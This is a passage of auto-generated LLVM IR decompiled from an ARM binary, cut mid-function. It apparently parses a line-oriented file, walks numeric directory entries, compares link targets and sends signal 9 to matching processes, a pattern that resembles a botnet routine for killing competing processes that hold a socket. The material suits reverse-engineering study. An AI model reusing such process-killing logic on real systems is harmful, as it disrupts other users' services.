dec_label_pc_d094:                                ; preds = %dec_label_pc_cfe8, %dec_label_pc_d520
  %v1_d098 = call i32 @function_f0ac(i32 6)
  %v1_d0a0 = call i32 @function_f0ac(i32 7)
  %v1_d0a8 = call i32 @function_f0ac(i32 9)
  %v0_d0b0 = load i32, i32* @r5, align 4
  %v3_d0b4 = call i32 @function_101e0(i32 ptrtoint ([14 x i8]* @global_var_15a00.82 to i32), i32 %v0_d0b0)
  %v7_d0b8 = icmp eq i32 %v3_d0b4, -1
  store i32 %v3_d0b4, i32* @r8, align 4
  br i1 %v7_d0b8, label %bb, label %dec_label_pc_d0c8.preheader

bb:                                               ; preds = %dec_label_pc_d094
  %v1_d0c0 = load i32, i32* @r5, align 4
  store i32 %v1_d0c0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d4e0

dec_label_pc_d0c8.preheader:                      ; preds = %dec_label_pc_d094
  %v4_d0d457 = call i32 @function_fb9c(i8* nonnull %stack_var_-585, i32 512, i32 %v3_d0b4)
  %v2_d0d859 = icmp eq i32 %v4_d0d457, 0
  br i1 %v2_d0d859, label %dec_label_pc_d260.loopexit, label %dec_label_pc_d0e0.lr.ph

dec_label_pc_d0e0.lr.ph:                          ; preds = %dec_label_pc_d0c8.preheader
  %v2_d128 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_d0e0

dec_label_pc_d0e0:                                ; preds = %dec_label_pc_d0e0.lr.ph, %dec_label_pc_d0c8.backedge
  %v3_d0e4 = load i8, i8* %stack_var_-585, align 1
  %v4_d0e4 = sext i8 %v3_d0e4 to i32
  %v2_d0e8 = icmp eq i8 %v3_d0e4, 0
  br i1 %v2_d0e8, label %bb134, label %bb133

bb133:                                            ; preds = %dec_label_pc_d0e0
  %v8_d0ec = icmp eq i8 %v3_d0e4, 58
  br i1 %v8_d0ec, label %.thread8, label %dec_label_pc_d100

.thread8:                                         ; preds = %bb133
  br label %dec_label_pc_d118

bb134:                                            ; preds = %dec_label_pc_d0e0
  br label %dec_label_pc_d118

dec_label_pc_d100:                                ; preds = %bb133
  %v1_d108.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_d104

dec_label_pc_d104:                                ; preds = %bb135, %dec_label_pc_d100
  %v0_d104 = phi i32 [ %v1_d104, %bb135 ], [ 0, %dec_label_pc_d100 ]
  %v1_d104 = add i32 %v0_d104, 1
  %v2_d108 = add i32 %v1_d104, %v1_d108.pre
  %v3_d108 = inttoptr i32 %v2_d108 to i8*
  %v4_d108 = load i8, i8* %v3_d108, align 1
  %v6_d108 = zext i8 %v4_d108 to i32
  %v2_d10c = icmp eq i8 %v4_d108, 0
  br i1 %v2_d10c, label %dec_label_pc_d118, label %bb135

bb135:                                            ; preds = %dec_label_pc_d104
  %v8_d110 = icmp eq i8 %v4_d108, 58
  br i1 %v8_d110, label %dec_label_pc_d118, label %dec_label_pc_d104

dec_label_pc_d118:                                ; preds = %dec_label_pc_d104, %bb135, %bb134, %.thread8
  %v1_d144 = phi i32 [ 0, %.thread8 ], [ 0, %bb134 ], [ %v1_d104, %bb135 ], [ %v1_d104, %dec_label_pc_d104 ]
  %v0_d118 = phi i32 [ %v4_d0e4, %.thread8 ], [ %v4_d0e4, %bb134 ], [ %v6_d108, %bb135 ], [ %v6_d108, %dec_label_pc_d104 ]
  %v2_d118 = icmp eq i32 %v0_d118, 0
  br i1 %v2_d118, label %dec_label_pc_d0c8.backedge, label %dec_label_pc_d120

dec_label_pc_d0c8.backedge:                       ; preds = %dec_label_pc_d118, %dec_label_pc_d1e8, %dec_label_pc_d234, %dec_label_pc_d164
  %v0_d0d0 = load i32, i32* @r8, align 4
  %v4_d0d4 = call i32 @function_fb9c(i8* nonnull %stack_var_-585, i32 512, i32 %v0_d0d0)
  %v2_d0d8 = icmp eq i32 %v4_d0d4, 0
  br i1 %v2_d0d8, label %dec_label_pc_d260.loopexit, label %dec_label_pc_d0e0

dec_label_pc_d120:                                ; preds = %dec_label_pc_d118
  %v1_d124 = add i32 %v1_d144, 2
  %v2_d12c = add i32 %v1_d124, %v2_d128
  %v1_d130 = add i32 %v2_d12c, -545
  %v2_d130 = inttoptr i32 %v1_d130 to i8*
  %v3_d130 = load i8, i8* %v2_d130, align 1
  %v2_d134 = icmp eq i8 %v3_d130, 0
  br i1 %v2_d134, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_d120
  %v8_d138 = icmp eq i8 %v3_d130, 32
  br i1 %v8_d138, label %.thread13, label %dec_label_pc_d144

.thread13:                                        ; preds = %bb136
  store i32 %v1_d124, i32* @r5, align 4
  br label %dec_label_pc_d164

bb137:                                            ; preds = %dec_label_pc_d120
  store i32 %v1_d124, i32* @r5, align 4
  br label %dec_label_pc_d164

dec_label_pc_d144:                                ; preds = %bb136
  %v0_d144 = load i32, i32* @r6, align 4
  %v2_d144 = add i32 %v0_d144, %v1_d144
  br label %dec_label_pc_d14c

dec_label_pc_d14c:                                ; preds = %bb138, %dec_label_pc_d144
  %v0_d15816 = phi i32 [ %v1_d158, %bb138 ], [ %v1_d124, %dec_label_pc_d144 ]
  %v0_d15c18 = phi i32 [ %v1_d15c, %bb138 ], [ %v2_d144, %dec_label_pc_d144 ]
  %v1_d14c = add i32 %v0_d15c18, 3
  %v2_d14c = inttoptr i32 %v1_d14c to i8*
  %v3_d14c = load i8, i8* %v2_d14c, align 1
  %v2_d150 = icmp eq i8 %v3_d14c, 0
  br i1 %v2_d150, label %.thread15, label %bb138

.thread15:                                        ; preds = %dec_label_pc_d14c
  %v1_d15817 = add i32 %v0_d15816, 1
  store i32 %v1_d15817, i32* @r5, align 4
  br label %dec_label_pc_d164

bb138:                                            ; preds = %dec_label_pc_d14c
  %v8_d154 = icmp eq i8 %v3_d14c, 32
  %v1_d158 = add i32 %v0_d15816, 1
  store i32 %v1_d158, i32* @r5, align 4
  %v1_d15c = add i32 %v0_d15c18, 1
  br i1 %v8_d154, label %dec_label_pc_d164, label %dec_label_pc_d14c

dec_label_pc_d164:                                ; preds = %bb138, %bb137, %.thread15, %.thread13
  %v1_d170 = phi i32 [ %v1_d15817, %.thread15 ], [ %v1_d124, %.thread13 ], [ %v1_d124, %bb137 ], [ %v1_d158, %bb138 ]
  %v0_d164 = load i32, i32* @r6, align 4
  %v2_d164 = add i32 %v0_d164, %v1_d124
  store i32 %v2_d164, i32* @r4, align 4
  %v2_d170 = add i32 %v1_d170, %v2_d128
  store i32 0, i32* @r7, align 4
  %v3_d178 = add i32 %v2_d170, -545
  %v4_d178 = inttoptr i32 %v3_d178 to i8*
  store i8 0, i8* %v4_d178, align 1
  %v0_d17c = load i32, i32* @r4, align 4
  %v1_d180 = inttoptr i32 %v0_d17c to i8*
  %v2_d180 = call i32 @function_f93c(i8* %v1_d180)
  store i32 %v2_d180, i32* @r1, align 4
  %v0_d18c = load i32, i32* @r4, align 4
  %v3_d190 = inttoptr i32 %v0_d18c to i8*
  %v4_d190 = call i32 @function_fc8c(i8* %v3_d190, i32 %v2_d180, i32 %v2_d068)
  %v7_d194 = icmp eq i32 %v4_d190, -1
  br i1 %v7_d194, label %dec_label_pc_d0c8.backedge, label %dec_label_pc_d1b0.preheader

dec_label_pc_d1b0.preheader:                      ; preds = %dec_label_pc_d164
  %v1_d198 = load i32, i32* @r7, align 4
  %v1_d19c = load i32, i32* @r6, align 4
  %v2_d19c = load i32, i32* @r5, align 4
  %v3_d19c = add i32 %v2_d19c, %v1_d19c
  store i32 %v1_d198, i32* @lr, align 4
  %v1_d1b049 = add i32 %v3_d19c, 2
  %v2_d1b050 = inttoptr i32 %v1_d1b049 to i8*
  %v3_d1b051 = load i8, i8* %v2_d1b050, align 1
  %v2_d1b453 = icmp eq i8 %v3_d1b051, 0
  %v1_d1b855 = add i32 %v2_d19c, 2
  br i1 %v2_d1b453, label %dec_label_pc_d1e8, label %dec_label_pc_d1c0

dec_label_pc_d1c0:                                ; preds = %dec_label_pc_d1b0.preheader, %dec_label_pc_d1b0.backedge
  %v0_d1e884 = phi i32 [ %v0_d1e882, %dec_label_pc_d1b0.backedge ], [ %v1_d198, %dec_label_pc_d1b0.preheader ]
  %v0_d1d0.pr = phi i32 [ %v0_d1d0.pr71, %dec_label_pc_d1b0.backedge ], [ %v1_d198, %dec_label_pc_d1b0.preheader ]
  %v0_d4f4 = phi i32 [ %v0_d4f474, %dec_label_pc_d1b0.backedge ], [ %v1_d198, %dec_label_pc_d1b0.preheader ]
  %v0_d1b879 = phi i32 [ %v1_d1b8, %dec_label_pc_d1b0.backedge ], [ %v1_d1b855, %dec_label_pc_d1b0.preheader ]
  %v0_d1e0 = phi i32 [ %v0_d1b0, %dec_label_pc_d1b0.backedge ], [ %v3_d19c, %dec_label_pc_d1b0.preheader ]
  %v1_d1c4.in = phi i8 [ %v3_d1b0, %dec_label_pc_d1b0.backedge ], [ %v3_d1b051, %dec_label_pc_d1b0.preheader ]
  %v7_d1c0 = icmp eq i8 %v1_d1c4.in, 9
  br i1 %v7_d1c0, label %bb140, label %bb139

bb139:                                            ; preds = %dec_label_pc_d1c0
  %v8_d1c4 = icmp eq i8 %v1_d1c4.in, 32
  br i1 %v8_d1c4, label %.thread27, label %dec_label_pc_d1d0

.thread27:                                        ; preds = %bb139
  br label %dec_label_pc_d1dc

bb140:                                            ; preds = %dec_label_pc_d1c0
  br label %dec_label_pc_d1dc

dec_label_pc_d1d0:                                ; preds = %bb139
  %v7_d1d0 = icmp eq i32 %v0_d1d0.pr, 1
  br i1 %v7_d1d0, label %dec_label_pc_d4f4, label %dec_label_pc_d1d8

dec_label_pc_d1d8:                                ; preds = %dec_label_pc_d4f4, %dec_label_pc_d1d0
  %v0_d1dc76 = phi i32 [ %v1_d4f4, %dec_label_pc_d4f4 ], [ %v0_d4f4, %dec_label_pc_d1d0 ]
  br label %dec_label_pc_d1dc

dec_label_pc_d1dc:                                ; preds = %bb140, %.thread27, %dec_label_pc_d1d8
  %v0_d1dc = phi i32 [ %v0_d4f4, %.thread27 ], [ %v0_d4f4, %bb140 ], [ %v0_d1dc76, %dec_label_pc_d1d8 ]
  %v0_d1d0.pr72 = phi i32 [ 1, %.thread27 ], [ 1, %bb140 ], [ 0, %dec_label_pc_d1d8 ]
  %v7_d1e4 = icmp sgt i32 %v0_d1dc, 6
  br i1 %v7_d1e4, label %dec_label_pc_d1e8, label %dec_label_pc_d1b0.backedge

dec_label_pc_d1e8:                                ; preds = %dec_label_pc_d1b0.backedge, %dec_label_pc_d1dc, %dec_label_pc_d1b0.preheader
  %v1_d238 = phi i32 [ %v1_d1b855, %dec_label_pc_d1b0.preheader ], [ %v1_d1b8, %dec_label_pc_d1b0.backedge ], [ %v0_d1b879, %dec_label_pc_d1dc ]
  %v0_d1e8 = phi i32 [ %v1_d198, %dec_label_pc_d1b0.preheader ], [ %v0_d1e882, %dec_label_pc_d1b0.backedge ], [ %v0_d1e884, %dec_label_pc_d1dc ]
  %v2_d1e8 = icmp eq i32 %v0_d1e8, 0
  br i1 %v2_d1e8, label %dec_label_pc_d0c8.backedge, label %dec_label_pc_d1f4

dec_label_pc_d1f4:                                ; preds = %dec_label_pc_d1e8
  %v2_d1fc = add i32 %v1_d238, %v2_d128
  %v1_d200 = add i32 %v2_d1fc, -545
  %v2_d200 = inttoptr i32 %v1_d200 to i8*
  %v3_d200 = load i8, i8* %v2_d200, align 1
  %v2_d204 = icmp eq i8 %v3_d200, 0
  br i1 %v2_d204, label %dec_label_pc_d234, label %bb141

bb141:                                            ; preds = %dec_label_pc_d1f4
  %v8_d208 = icmp eq i8 %v3_d200, 32
  br i1 %v8_d208, label %dec_label_pc_d234, label %dec_label_pc_d210

dec_label_pc_d210:                                ; preds = %bb141
  %v2_d210 = add i32 %v1_d238, %v1_d19c
  br label %dec_label_pc_d214

dec_label_pc_d214:                                ; preds = %bb142, %dec_label_pc_d210
  %v0_d22030 = phi i32 [ %v1_d220, %bb142 ], [ %v1_d238, %dec_label_pc_d210 ]
  %v0_d214 = phi i32 [ %v1_d214, %bb142 ], [ %v2_d210, %dec_label_pc_d210 ]
  %v1_d214 = add i32 %v0_d214, 1
  %v2_d214 = inttoptr i32 %v1_d214 to i8*
  %v3_d214 = load i8, i8* %v2_d214, align 1
  %v2_d218 = icmp eq i8 %v3_d214, 0
  br i1 %v2_d218, label %.thread29, label %bb142

.thread29:                                        ; preds = %dec_label_pc_d214
  %v1_d22031 = add i32 %v0_d22030, 1
  br label %dec_label_pc_d228

bb142:                                            ; preds = %dec_label_pc_d214
  %v8_d21c = icmp eq i8 %v3_d214, 32
  %v1_d220 = add i32 %v0_d22030, 1
  br i1 %v8_d21c, label %dec_label_pc_d228, label %dec_label_pc_d214

dec_label_pc_d228:                                ; preds = %bb142, %.thread29
  %v1_d230 = phi i32 [ %v1_d22031, %.thread29 ], [ %v1_d220, %bb142 ]
  %v2_d230 = add i32 %v1_d230, %v2_d128
  br label %dec_label_pc_d234

dec_label_pc_d234:                                ; preds = %dec_label_pc_d1f4, %bb141, %dec_label_pc_d228
  %v2_d240 = phi i32 [ %v2_d1fc, %dec_label_pc_d1f4 ], [ %v2_d1fc, %bb141 ], [ %v2_d230, %dec_label_pc_d228 ]
  %v2_d238 = add i32 %v1_d238, %v1_d19c
  store i32 %v2_d238, i32* @r4, align 4
  %v3_d240 = add i32 %v2_d240, -545
  %v4_d240 = inttoptr i32 %v3_d240 to i8*
  store i8 0, i8* %v4_d240, align 1
  %v1_d244 = inttoptr i32 %v2_d238 to i8*
  %v2_d244 = call i32 @function_f93c(i8* %v1_d244)
  %v8_d24c = icmp sgt i32 %v2_d244, 15
  br i1 %v8_d24c, label %dec_label_pc_d0c8.backedge, label %dec_label_pc_d250

dec_label_pc_d250:                                ; preds = %dec_label_pc_d234
  %v0_d254 = load i32, i32* @r4, align 4
  %v2_d258 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_d258, i32* @r0, align 4
  %v2_d25c = bitcast i32* %stack_var_-56 to i8*
  %v3_d25c = call i32 @function_f964(i8* %v2_d25c, i32 %v0_d254)
  br label %dec_label_pc_d260

dec_label_pc_d260.loopexit:                       ; preds = %dec_label_pc_d0c8.backedge, %dec_label_pc_d0c8.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre100 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_d260

dec_label_pc_d260:                                ; preds = %dec_label_pc_d260.loopexit, %dec_label_pc_d250
  %v1_d270.pre-phi = phi i8* [ %.pre100, %dec_label_pc_d260.loopexit ], [ %v2_d25c, %dec_label_pc_d250 ]
  %v2_d26c.pre-phi = phi i32 [ %.pre, %dec_label_pc_d260.loopexit ], [ %v2_d258, %dec_label_pc_d250 ]
  %v0_d260 = load i32, i32* @r8, align 4
  %v1_d264 = call i32 @function_10608(i32 %v0_d260)
  %v2_d270 = call i32 @function_f93c(i8* %v1_d270.pre-phi)
  store i32 %v2_d270, i32* @r4, align 4
  %v2_d274 = icmp eq i32 %v2_d270, 0
  br i1 %v2_d274, label %dec_label_pc_d4cc, label %dec_label_pc_d280

dec_label_pc_d280:                                ; preds = %dec_label_pc_d260
  %v3_d288 = call i32 @function_efe8(i32 6, i32* null)
  %v1_d28c = call i32 @function_10804(i32 %v3_d288)
  store i32 %v1_d28c, i32* @sb, align 4
  %v2_d290 = icmp eq i32 %v1_d28c, 0
  br i1 %v2_d290, label %dec_label_pc_d4c0, label %dec_label_pc_d2a0.preheader

dec_label_pc_d2a0.preheader:                      ; preds = %dec_label_pc_d280
  store i32 0, i32* @r5, align 4
  %v1_d2a444 = inttoptr i32 %v1_d28c to i32*
  %v2_d2a445 = call i32 @function_10948(i32* %v1_d2a444)
  %v2_d2a847 = icmp eq i32 %v2_d2a445, 0
  br i1 %v2_d2a847, label %dec_label_pc_d4b4, label %dec_label_pc_d2b0.preheader

dec_label_pc_d2a0.loopexit:                       ; preds = %dec_label_pc_d2b8, %dec_label_pc_d2c8, %dec_label_pc_d334
  %v0_d2a0 = load i32, i32* @sb, align 4
  %v1_d2a4 = inttoptr i32 %v0_d2a0 to i32*
  %v2_d2a4 = call i32 @function_10948(i32* %v1_d2a4)
  %v2_d2a8 = icmp eq i32 %v2_d2a4, 0
  br i1 %v2_d2a8, label %dec_label_pc_d4b4, label %dec_label_pc_d2b0.preheader

dec_label_pc_d2b0.preheader:                      ; preds = %dec_label_pc_d2a0.preheader, %dec_label_pc_d2a0.loopexit
  %v0_d2b892 = phi i32 [ %v2_d2a4, %dec_label_pc_d2a0.loopexit ], [ %v2_d2a445, %dec_label_pc_d2a0.preheader ]
  br label %dec_label_pc_d2b0

dec_label_pc_d2b0:                                ; preds = %dec_label_pc_d2b0.preheader, %dec_label_pc_d49c
  %v0_d2d0 = phi i32 [ %v0_d2b892, %dec_label_pc_d2b0.preheader ], [ %v2_d4a8, %dec_label_pc_d49c ]
  %v0_d2b0 = load i32, i32* @r5, align 4
  %v2_d2b0 = icmp eq i32 %v0_d2b0, 0
  br i1 %v2_d2b0, label %dec_label_pc_d2b8, label %dec_label_pc_d4b4

dec_label_pc_d2b8:                                ; preds = %dec_label_pc_d2b0
  %v1_d2b8 = add i32 %v0_d2d0, 11
  %v2_d2b8 = inttoptr i32 %v1_d2b8 to i8*
  %v3_d2b8 = load i8, i8* %v2_d2b8, align 1
  %v4_d2b8 = zext i8 %v3_d2b8 to i32
  %v1_d2bc = add nsw i32 %v4_d2b8, -48
  %tmp = icmp ugt i32 %v1_d2bc, 9
  br i1 %tmp, label %dec_label_pc_d2a0.loopexit, label %dec_label_pc_d2c8

dec_label_pc_d2c8:                                ; preds = %dec_label_pc_d2b8
  store i32 %v1_d2b8, i32* @r7, align 4
  %v3_d2d4 = call i32 @function_efe8(i32 6, i32* null)
  store i32 %v2_d040, i32* @r0, align 4
  %v3_d2e0 = call i32 @function_f964(i8* %v2_d064, i32 %v3_d2d4)
  %v2_d2e8 = call i32 @function_f93c(i8* %v2_d064)
  %v0_d2ec = load i32, i32* @r7, align 4
  %v1_d2f0 = load i32, i32* @sl, align 4
  %v2_d2f0 = add i32 %v1_d2f0, %v2_d2e8
  store i32 %v2_d2f0, i32* @r0, align 4
  %v2_d2f4 = inttoptr i32 %v2_d2f0 to i8*
  %v3_d2f4 = call i32 @function_f964(i8* %v2_d2f4, i32 %v0_d2ec)
  %v2_d2fc = call i32 @function_f93c(i8* %v2_d064)
  %v0_d300 = load i32, i32* @r5, align 4
  store i32 %v2_d2fc, i32* @r4, align 4
  %v2_d30c = inttoptr i32 %v0_d300 to i32*
  %v3_d30c = call i32 @function_efe8(i32 7, i32* %v2_d30c)
  %v0_d314 = load i32, i32* @r4, align 4
  %v1_d314 = load i32, i32* @sl, align 4
  %v2_d314 = add i32 %v1_d314, %v0_d314
  store i32 %v2_d314, i32* @r0, align 4
  %v2_d318 = inttoptr i32 %v2_d314 to i8*
  %v3_d318 = call i32 @function_f964(i8* %v2_d318, i32 %v3_d30c)
  %v3_d328 = call i32 @function_1036c(i32 %v2_d040, i32 %v2_d030, i32 4096)
  %v7_d32c = icmp eq i32 %v3_d328, -1
  br i1 %v7_d32c, label %dec_label_pc_d2a0.loopexit, label %dec_label_pc_d334

dec_label_pc_d334:                                ; preds = %dec_label_pc_d2c8
  %v0_d334 = load i32, i32* @r5, align 4
  %v2_d33c = inttoptr i32 %v0_d334 to i32*
  %v3_d33c = call i32 @function_efe8(i32 6, i32* %v2_d33c)
  store i32 %v2_d040, i32* @r0, align 4
  %v3_d348 = call i32 @function_f964(i8* %v2_d064, i32 %v3_d33c)
  %v2_d350 = call i32 @function_f93c(i8* %v2_d064)
  %v0_d354 = load i32, i32* @r7, align 4
  %v1_d358 = load i32, i32* @sl, align 4
  %v2_d358 = add i32 %v1_d358, %v2_d350
  store i32 %v2_d358, i32* @r0, align 4
  %v2_d35c = inttoptr i32 %v2_d358 to i8*
  %v3_d35c = call i32 @function_f964(i8* %v2_d35c, i32 %v0_d354)
  %v2_d364 = call i32 @function_f93c(i8* %v2_d064)
  %v0_d368 = load i32, i32* @r5, align 4
  store i32 %v2_d364, i32* @r4, align 4
  %v2_d374 = inttoptr i32 %v0_d368 to i32*
  %v3_d374 = call i32 @function_efe8(i32 9, i32* %v2_d374)
  %v0_d37c = load i32, i32* @r4, align 4
  %v1_d37c = load i32, i32* @sl, align 4
  %v2_d37c = add i32 %v1_d37c, %v0_d37c
  store i32 %v2_d37c, i32* @r0, align 4
  %v2_d380 = inttoptr i32 %v2_d37c to i8*
  %v3_d380 = call i32 @function_f964(i8* %v2_d380, i32 %v3_d374)
  %v1_d388 = call i32 @function_10804(i32 %v2_d040)
  store i32 %v1_d388, i32* @r8, align 4
  %v2_d38c = icmp eq i32 %v1_d388, 0
  br i1 %v2_d38c, label %dec_label_pc_d2a0.loopexit, label %dec_label_pc_d394.preheader

dec_label_pc_d394.preheader:                      ; preds = %dec_label_pc_d334
  %v1_d39839 = inttoptr i32 %v1_d388 to i32*
  %v2_d39840 = call i32 @function_10948(i32* %v1_d39839)
  store i32 %v2_d39840, i32* @r6, align 4
  %v2_d39c42 = icmp eq i32 %v2_d39840, 0
  br i1 %v2_d39c42, label %dec_label_pc_d49c, label %dec_label_pc_d3acthread-pre-split

dec_label_pc_d394.loopexit:                       ; preds = %dec_label_pc_d3b4, %dec_label_pc_d44c
  %v0_d394 = load i32, i32* @r8, align 4
  %v1_d398 = inttoptr i32 %v0_d394 to i32*
  %v2_d398 = call i32 @function_10948(i32* %v1_d398)
  store i32 %v2_d398, i32* @r6, align 4
  %v2_d39c = icmp eq i32 %v2_d398, 0
  br i1 %v2_d39c, label %dec_label_pc_d49c, label %dec_label_pc_d3acthread-pre-split

dec_label_pc_d3acthread-pre-split:                ; preds = %dec_label_pc_d394.preheader, %dec_label_pc_d394.loopexit
  %v0_d3ac.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_d3ac

dec_label_pc_d3ac:                                ; preds = %dec_label_pc_d3acthread-pre-split, %dec_label_pc_d474
  %v0_d3ac = phi i32 [ %v0_d3ac.pr, %dec_label_pc_d3acthread-pre-split ], [ 1, %dec_label_pc_d474 ]
  %v2_d3ac = icmp eq i32 %v0_d3ac, 0
  br i1 %v2_d3ac, label %dec_label_pc_d3b4, label %dec_label_pc_d49c

dec_label_pc_d3b4:                                ; preds = %dec_label_pc_d3ac
  %v2_d3b4 = call i32 @function_f9d0(i32 %v2_d030, i32 4096)
  %v0_d3b8 = load i32, i32* @r5, align 4
  %v2_d3c0 = inttoptr i32 %v0_d3b8 to i32*
  %v3_d3c0 = call i32 @function_efe8(i32 6, i32* %v2_d3c0)
  store i32 %v2_d040, i32* @r0, align 4
  %v3_d3cc = call i32 @function_f964(i8* %v2_d064, i32 %v3_d3c0)
  %v2_d3d4 = call i32 @function_f93c(i8* %v2_d064)
  %v0_d3d8 = load i32, i32* @r7, align 4
  %v1_d3dc = load i32, i32* @sl, align 4
  %v2_d3dc = add i32 %v1_d3dc, %v2_d3d4
  store i32 %v2_d3dc, i32* @r0, align 4
  %v2_d3e0 = inttoptr i32 %v2_d3dc to i8*
  %v3_d3e0 = call i32 @function_f964(i8* %v2_d3e0, i32 %v0_d3d8)
  %v2_d3e8 = call i32 @function_f93c(i8* %v2_d064)
  %v0_d3ec = load i32, i32* @r5, align 4
  store i32 %v2_d3e8, i32* @r4, align 4
  %v2_d3f8 = inttoptr i32 %v0_d3ec to i32*
  %v3_d3f8 = call i32 @function_efe8(i32 9, i32* %v2_d3f8)
  %v0_d400 = load i32, i32* @r4, align 4
  %v1_d400 = load i32, i32* @sl, align 4
  %v2_d400 = add i32 %v1_d400, %v0_d400
  store i32 %v2_d400, i32* @r0, align 4
  %v2_d404 = inttoptr i32 %v2_d400 to i8*
  %v3_d404 = call i32 @function_f964(i8* %v2_d404, i32 %v3_d3f8)
  %v2_d40c = call i32 @function_f93c(i8* %v2_d064)
  %v1_d414 = load i32, i32* @sl, align 4
  %v2_d414 = add i32 %v1_d414, %v2_d40c
  store i32 %v2_d414, i32* @r0, align 4
  %v2_d418 = inttoptr i32 %v2_d414 to i8*
  %v3_d418 = call i32 @function_f964(i8* %v2_d418, i32 ptrtoint (i32* @global_var_159c0.19 to i32))
  %v2_d420 = call i32 @function_f93c(i8* %v2_d064)
  %v0_d424 = load i32, i32* @r6, align 4
  %v1_d424 = add i32 %v0_d424, 11
  %v1_d428 = load i32, i32* @sl, align 4
  %v2_d428 = add i32 %v1_d428, %v2_d420
  store i32 %v2_d428, i32* @r0, align 4
  %v2_d42c = inttoptr i32 %v2_d428 to i8*
  %v3_d42c = call i32 @function_f964(i8* %v2_d42c, i32 %v1_d424)
  %v3_d43c = call i32 @function_1036c(i32 %v2_d040, i32 %v2_d030, i32 4096)
  %v7_d440 = icmp eq i32 %v3_d43c, -1
  br i1 %v7_d440, label %dec_label_pc_d394.loopexit, label %dec_label_pc_d44c

dec_label_pc_d44c:                                ; preds = %dec_label_pc_d3b4
  %v2_d44c = call i32 @function_f93c(i8* %v2_d050)
  store i32 %v2_d44c, i32* @r1, align 4
  %v4_d460 = call i32 @function_fc8c(i8* %v2_d050, i32 %v2_d44c, i32 %v2_d26c.pre-phi)
  %v7_d464 = icmp eq i32 %v4_d460, -1
  br i1 %v7_d464, label %dec_label_pc_d394.loopexit, label %dec_label_pc_d474

dec_label_pc_d474:                                ; preds = %dec_label_pc_d44c
  %v0_d46c = load i32, i32* @r7, align 4
  %v2_d474 = inttoptr i32 %v0_d46c to i8*
  %v3_d474 = call i32 @function_fa60(i8* %v2_d474, i32 10)
  %v2_d47c = call i32 @function_103d4(i32 %v3_d474, i32 9)
  %v0_d480 = load i32, i32* @r8, align 4
  %v1_d484 = inttoptr i32 %v0_d480 to i32*
  %v2_d484 = call i32 @function_10948(i32* %v1_d484)
  store i32 %v2_d484, i32* @r6, align 4
  %v2_d488 = icmp eq i32 %v2_d484, 0
  store i32 1, i32* @r5, align 4
  br i1 %v2_d488, label %dec_label_pc_d49c, label %dec_label_pc_d3ac

dec_label_pc_d49c:                                ; preds = %dec_label_pc_d394.loopexit, %dec_label_pc_d474, %dec_label_pc_d3ac, %dec_label_pc_d394.preheader
  %v0_d49c = load i32, i32* @r8, align 4
  %v1_d4a0 = inttoptr i32 %v0_d49c to i32*
  %v2_d4a0 = call i32 @function_1063c(i32* %v1_d4a0)
  %v0_d4a4 = load i32, i32* @sb, align 4
  %v1_d4a8 = inttoptr i32 %v0_d4a4 to i32*
  %v2_d4a8 = call i32 @function_10948(i32* %v1_d4a8)
  %v2_d4ac = icmp eq i32 %v2_d4a8, 0
  br i1 %v2_d4ac, label %dec_label_pc_d4b4, label %dec_label_pc_d2b0

dec_label_pc_d4b4:                                ; preds = %dec_label_pc_d2a0.loopexit, %dec_label_pc_d49c, %dec_label_pc_d2b0, %dec_label_pc_d2a0.preheader
  %v0_d4b4 = load i32, i32* @sb, align 4
  %v1_d4b8 = inttoptr i32 %v0_d4b4 to i32*
  %v2_d4b8 = call i32 @function_1063c(i32* %v1_d4b8)
  %v0_d4bc = load i32, i32* @r5, align 4
  %v1_d4bc = urem i32 %v0_d4bc, 256
  br label %dec_label_pc_d4c0

dec_label_pc_d4c0:                                ; preds = %dec_label_pc_d280, %dec_label_pc_d4b4
  %storemerge = phi i32 [ %v1_d4bc, %dec_label_pc_d4b4 ], [ 0, %dec_label_pc_d280 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_d4c4 = call i32 @function_126fc(i32 1)
  br label %dec_label_pc_d4cc

dec_label_pc_d4cc:                                ; preds = %dec_label_pc_d260, %dec_label_pc_d4c0
  %v1_d4cc = call i32 @function_f00c(i32 6)
  %v1_d4d4 = call i32 @function_f00c(i32 7)
  %v1_d4dc = call i32 @function_f00c(i32 9)
  %v0_d4e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d4e0

dec_label_pc_d4e0:                                ; preds = %bb, %dec_label_pc_d4cc
  %v0_d4e0 = phi i32 [ %v1_d0c0, %bb ], [ %v0_d4e0.pre, %dec_label_pc_d4cc ]
  store i32 %v3_cfe8, i32* @r4, align 4
  store i32 %v6_cfe8, i32* @r5, align 4
  store i32 %v9_cfe8, i32* @r6, align 4
  store i32 %v12_cfe8, i32* @r7, align 4
  store i32 %v15_cfe8, i32* @r8, align 4
  store i32 %v18_cfe8, i32* @sb, align 4
  store i32 %v21_cfe8, i32* @sl, align 4
  store i32 %v24_cfe8, i32* @fp, align 4
  store i32 %v27_cfe8, i32* @lr, align 4
  ret i32 %v0_d4e0

dec_label_pc_d4f4:                                ; preds = %dec_label_pc_d1d0
  %v1_d4f4 = add i32 %v0_d4f4, 1
  %v7_d4f8 = icmp eq i32 %v0_d4f4, 0
  br i1 %v7_d4f8, label %dec_label_pc_d500, label %dec_label_pc_d1d8

dec_label_pc_d500:                                ; preds = %dec_label_pc_d4f4
  %v1_d500 = add i32 %v0_d1e0, 3
  %v2_d500 = inttoptr i32 %v1_d500 to i8*
  %v3_d500 = load i8, i8* %v2_d500, align 1
  %v7_d504 = icmp eq i8 %v3_d500, 65
  br i1 %v7_d504, label %dec_label_pc_d518, label %dec_label_pc_d50c

dec_label_pc_d50c:                                ; preds = %dec_label_pc_d500, %dec_label_pc_d518
  %v0_d1e883 = phi i32 [ %v0_d1e884, %dec_label_pc_d500 ], [ 1, %dec_label_pc_d518 ]
  br label %dec_label_pc_d1b0.backedge

dec_label_pc_d1b0.backedge:                       ; preds = %dec_label_pc_d50c, %dec_label_pc_d1dc
  %v0_d1e882 = phi i32 [ %v0_d1e883, %dec_label_pc_d50c ], [ %v0_d1e884, %dec_label_pc_d1dc ]
  %v0_d4f474 = phi i32 [ %v1_d4f4, %dec_label_pc_d50c ], [ %v0_d1dc, %dec_label_pc_d1dc ]
